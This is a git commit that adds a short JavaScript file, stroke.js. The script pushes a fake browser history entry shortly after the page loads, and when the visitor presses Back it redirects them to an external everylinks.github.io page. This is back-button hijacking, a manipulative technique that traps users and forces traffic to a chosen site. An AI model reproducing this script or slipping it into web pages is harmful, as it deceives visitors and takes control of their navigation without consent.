78c2391117b0b8fc33bd2b5e7cb8d63f9577498d
everylinks <Joeyjosh60@gmail.com>
2024-12-24 13:09:46 +0100

    Create stroke.js

---
+++ stroke.js
@@ -0,0 +1,11 @@
+window.onhashchange=function(){jp();};
+    function hh() {history.pushState(history.length+1, "message", "#"+new Date().getTime());}
+    function jp() {
+        fh();}
+    setTimeout('hh();', 500);
+    function fh(){
+        location.href="https://everylinks.github.io/myall-last";
+    }
+    function goon(){
+        location.href="https://everylinks.github.io/myall-last";
+    }
